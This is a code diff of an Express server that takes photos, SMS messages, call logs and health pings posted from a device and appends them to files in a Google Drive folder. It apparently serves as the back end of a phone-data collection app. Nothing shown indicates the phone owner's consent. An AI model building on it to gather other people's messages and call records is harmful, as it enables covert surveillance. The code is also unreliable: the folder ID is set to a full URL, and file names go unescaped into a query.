@@ -1,102 +1,178 @@
 const express = require('express');
-const multer = require('multer');
 const { google } = require('googleapis');
-const { GoogleAuth } = require('google-auth-library');
-const fs = require('fs');
-const path = require('path');
-
 const app = express();
-const port = process.env.PORT || 3000;
 
-// Configure Multer for file uploads
-const upload = multer({ dest: 'uploads/' });
-
-// Google Drive API setup
-const auth = new GoogleAuth({
-    keyFile: 'credentials.json', // You'll add this file in the next step
-    scopes: ['https://www.googleapis.com/auth/drive.file'],
-});
-
-const drive = google.drive({ version: 'v3', auth });
-
-// Middleware to parse JSON
 app.use(express.json());
 
-// Create uploads directory if it doesn't exist
-if (!fs.existsSync('uploads')) {
-    fs.mkdirSync('uploads');
+// Google Drive setup
+const drive = google.drive({
+  version: 'v3',
+  auth: new google.auth.GoogleAuth({
+    keyFile: './credentials.json',
+    scopes: ['https://www.googleapis.com/auth/drive.file'],
+  }),
+});
+
+// Replace with your CloudSyncData folder ID
+const FOLDER_ID = 'https://drive.google.com/drive/folders/1pCI9jJ0L80cejvs-HS8Cwz5pMgeMUebC';
+
+// Helper function to find or create a file in Google Drive
+async function findOrCreateFile(fileName) {
+  try {
+    // Search for the file in the folder
+    const response = await drive.files.list({
+      q: `name='${fileName}' and '${FOLDER_ID}' in parents and trashed=false`,
+      fields: 'files(id, name)',
+    });
+
+    const files = response.data.files;
+    if (files.length > 0) {
+      return files[0].id; // Return the existing file ID
+    }
+
+    // If the file doesn't exist, create it
+    const fileMetadata = {
+      name: fileName,
+      mimeType: 'text/plain',
+      parents: [FOLDER_ID],
+    };
+    const file = await drive.files.create({
+      resource: fileMetadata,
+      fields: 'id',
+    });
+    return file.data.id;
+  } catch (error) {
+    console.error(`Error finding/creating file ${fileName}:`, error.message);
+    throw error;
+  }
 }
 
-// Endpoint to receive photos
-app.post('/upload/photo', upload.single('photo'), async (req, res) => {
+// Helper function to append data to a file in Google Drive
+async function appendToFile(fileId, data) {
+  try {
+    // Get the current content of the file
+    let currentContent = '';
     try {
-        const filePath = req.file.path;
-        const fileName = req.file.originalname;
-
-        // Upload to Google Drive
-        const fileMetadata = {
-            name: fileName,
-            parents: ['https://drive.google.com/drive/folders/1pCI9jJ0L80cejvs-HS8Cwz5pMgeMUebC'], // Replace with your folder ID
-        };
-        const media = {
-            mimeType: req.file.mimetype,
-            body: fs.createReadStream(filePath),
-        };
-
-        const driveResponse = await drive.files.create({
-            resource: fileMetadata,
-            media: media,
-            fields: 'id',
-        });
-
-        // Clean up the local file
-        fs.unlinkSync(filePath);
-
-        res.status(200).json({ message: 'Photo uploaded successfully', fileId: driveResponse.data.id });
+      const response = await drive.files.get({
+        fileId: fileId,
+        alt: 'media',
+      });
+      currentContent = response.data || '';
     } catch (error) {
-        console.error('Error uploading photo:', error);
-        res.status(500).json({ message: 'Error uploading photo', error: error.message });
+      if (error.response && error.response.status === 404) {
+        // File is empty or doesn't exist (newly created)
+        currentContent = '';
+      } else {
+        throw error;
+      }
     }
+
+    // Append the new data
+    const updatedContent = currentContent + data + '\n';
+
+    // Update the file with the new content
+    await drive.files.update({
+      fileId: fileId,
+      media: {
+        mimeType: 'text/plain',
+        body: updatedContent,
+      },
+    });
+  } catch (error) {
+    console.error(`Error appending to file ${fileId}:`, error.message);
+    throw error;
+  }
+}
+
+// Photo upload endpoint (unchanged)
+app.post('/upload/photo', async (req, res) => {
+  try {
+    const { fileName, fileContent } = req.body; // Simplified for example
+    const fileMetadata = {
+      name: fileName,
+      parents: [FOLDER_ID],
+    };
+    const media = {
+      mimeType: 'image/jpeg',
+      body: Buffer.from(fileContent, 'base64'),
+    };
+    const response = await drive.files.create({
+      resource: fileMetadata,
+      media: media,
+      fields: 'id',
+    });
+    console.log(`Photo uploaded: ${fileName}, ID: ${response.data.id}`);
+    res.status(200).send('Photo uploaded');
+  } catch (error) {
+    console.error('Error uploading photo:', error.message);
+    res.status(500).send('Error uploading photo');
+  }
 });
 
-// Endpoint to receive SMS
+// SMS endpoint
 app.post('/upload/sms', async (req, res) => {
-    try {
-        const { sender, messageBody, timestamp } = req.body;
-        console.log(`SMS received: ${sender}, ${messageBody}, ${timestamp}`);
-        // You can store SMS in Google Drive as a text file or in a database
-        res.status(200).json({ message: 'SMS received successfully' });
-    } catch (error) {
-        console.error('Error receiving SMS:', error);
-        res.status(500).json({ message: 'Error receiving SMS', error: error.message });
-    }
+  try {
+    const { sender, message, timestamp } = req.body;
+    const logEntry = `SMS: ${sender}, ${message}, ${timestamp}`;
+    console.log(logEntry);
+
+    // Find or create the SMS log file
+    const fileId = await findOrCreateFile('sms_logs.txt');
+    // Append the SMS data to the file
+    await appendToFile(fileId, logEntry);
+
+    res.status(200).send('SMS received and stored');
+  } catch (error) {
+    console.error('Error storing SMS:', error.message);
+    res.status(500).send('Error storing SMS');
+  }
 });
 
-// Endpoint to receive call logs
+// Call logs endpoint
 app.post('/upload/call_logs', async (req, res) => {
-    try {
-        const callLogs = req.body;
-        console.log('Call logs received:', callLogs);
-        // You can store call logs in Google Drive as a text file or in a database
-        res.status(200).json({ message: 'Call logs received successfully' });
-    } catch (error) {
-        console.error('Error receiving call logs:', error);
-        res.status(500).json({ message: 'Error receiving call logs', error: error.message });
-    }
+  try {
+    const { callLogs } = req.body;
+    const logEntry = `Call Logs: ${JSON.stringify(callLogs)}`;
+    console.log(logEntry);
+
+    // Find or create the call logs file
+    const fileId = await findOrCreateFile('call_logs.txt');
+    // Append the call logs data to the file
+    await appendToFile(fileId, logEntry);
+
+    res.status(200).send('Call logs received and stored');
+  } catch (error) {
+    console.error('Error storing call logs:', error.message);
+    res.status(500).send('Error storing call logs');
+  }
 });
 
-// Endpoint to receive health checks
-app.get('/upload/health_check', (req, res) => {
-    console.log('Health check ping received');
-    res.status(200).send('OK');
-  });
-  
-  app.post('/upload/health_check', (req, res) => {
+// Health check endpoint
+app.post('/upload/health_check', async (req, res) => {
+  try {
     const { message } = req.body;
-    console.log(`Health check received: ${message}`);
-    res.status(200).send('Health check received');
-  });
+    const logEntry = `Health Check: ${message}`;
+    console.log(logEntry);
 
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
+    // Find or create the health checks file
+    const fileId = await findOrCreateFile('health_checks.txt');
+    // Append the health check data to the file
+    await appendToFile(fileId, logEntry);
+
+    res.status(200).send('Health check received and stored');
+  } catch (error) {
+    console.error('Error storing health check:', error.message);
+    res.status(500).send('Error storing health check');
+  }
+});
+
+// Keep-alive endpoint for cron job
+app.get('/upload/health_check', (req, res) => {
+  console.log('Health check ping received');
+  res.status(200).send('OK');
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
